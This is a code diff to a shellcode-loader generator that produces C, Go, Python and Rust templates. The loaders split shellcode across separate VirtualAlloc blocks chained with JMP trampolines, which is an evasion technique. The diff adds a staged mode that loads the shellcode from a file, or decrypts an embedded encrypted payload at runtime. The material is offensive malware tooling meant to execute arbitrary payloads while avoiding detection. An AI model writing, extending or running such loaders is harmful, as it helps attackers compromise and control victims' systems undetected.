@@ -167,18 +167,22 @@ def _pad_chunks(shellcode: bytes, chunk_size: int) -> bytes:
     return padded
 
 
+# {sc_embed}    — global declarations (encrypted array + key, or empty for staged)
+# {sc_init}     — in-main init block (decrypt loop or file-reading code)
+# {main_decl}   — main() signature (void or int argc, char *argv[])
 _C_TEMPLATE = """\
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 
-{sc_array}
+{sc_embed}
 
 #define CHUNK_SIZE   {chunk_size}
 #define TRAMP_SIZE   13   /* mov r11, imm64 (10B) + jmp r11 (3B) */
 
-int main(void) {{
+{main_decl} {{
+    {sc_init}
     int n = (sc_len + CHUNK_SIZE - 1) / CHUNK_SIZE;
     LPVOID *mem = (LPVOID *)calloc(n, sizeof(LPVOID));
     if (!mem) return 1;
@@ -286,21 +290,25 @@ kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
 """
 
 
+# {sc_embed}    — package-level declarations (or empty for staged)
+# {sc_init}     — first statement(s) in main (decrypt loop or file-reading)
+# {sc_imports}  — extra import entries, e.g. \n\t"os" for staged
 _GO_TEMPLATE = """\
 package main
 
 import (
 \t"encoding/binary"
 \t"syscall"
-\t"unsafe"
+\t"unsafe"{sc_imports}
 )
 
-{sc_bytes}
+{sc_embed}
 
 const chunkSize = {chunk_size}
 const trampSize = 13
 
 func main() {{
+\t{sc_init}
 \tk32             := syscall.NewLazyDLL("kernel32.dll")
 \tpVirtualAlloc   := k32.NewProc("VirtualAlloc")
 \tpVirtualFree    := k32.NewProc("VirtualFree")
@@ -350,6 +358,7 @@ func main() {{
 }}
 """
 
+# {sc_bytes} is inside fn main() — single block (decl + decrypt or file-read)
 _RS_TEMPLATE = """\
 #![allow(non_snake_case)]
 use std::{{mem, ptr}};
@@ -410,37 +419,53 @@ fn main() {{
 """
 
 
-def generate_c(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
+def generate_c(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK, staged: bool = False) -> str:
     """Return a C loader that fragments shellcode into separate VirtualAlloc blocks."""
     padded = _pad_chunks(shellcode, chunk_size)
+    if staged:
+        embed, init = _render.c_staged_sc("sc")
+        main_decl = "int main(int argc, char *argv[])"
+    else:
+        embed, init = _render.c_sc_block(padded, "sc")
+        main_decl = "int main(void)"
     return _C_TEMPLATE.format(
-        sc_array=_render.c_array_literal(padded, "sc"),
+        sc_embed=embed,
+        sc_init=init,
+        main_decl=main_decl,
         chunk_size=chunk_size,
     )
 
 
-def generate_python(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
+def generate_python(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK, staged: bool = False) -> str:
     """Return a Python ctypes loader using fragmented allocations + JMP trampolines."""
     padded = _pad_chunks(shellcode, chunk_size)
+    sc_bytes = _render.py_staged_sc("sc") if staged else _render.py_sc_block(padded, "sc")
     return _PY_TEMPLATE.format(
-        sc_bytes=_render.python_bytes_literal(padded, "sc"),
+        sc_bytes=sc_bytes,
         chunk_size=chunk_size,
     )
 
 
-def generate_go(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
+def generate_go(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK, staged: bool = False) -> str:
     """Return a Go loader using fragmented VirtualAlloc blocks + JMP trampolines."""
     padded = _pad_chunks(shellcode, chunk_size)
+    if staged:
+        embed, init, imports = _render.go_staged_sc("sc")
+    else:
+        embed, init, imports = _render.go_sc_block(padded, "sc")
     return _GO_TEMPLATE.format(
-        sc_bytes=_render.go_bytes_literal(padded, "sc"),
+        sc_embed=embed,
+        sc_init=init,
+        sc_imports=imports,
         chunk_size=chunk_size,
     )
 
 
-def generate_rust(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK) -> str:
+def generate_rust(shellcode: bytes, chunk_size: int = _DEFAULT_CHUNK, staged: bool = False) -> str:
     """Return a Rust loader using fragmented VirtualAlloc blocks + JMP trampolines."""
     padded = _pad_chunks(shellcode, chunk_size)
+    sc_bytes = _render.rust_staged_sc("sc") if staged else _render.rust_sc_block(padded, "sc")
     return _RS_TEMPLATE.format(
-        sc_bytes=_render.rust_bytes_literal(padded, "sc"),
+        sc_bytes=sc_bytes,
         chunk_size=chunk_size,
     )
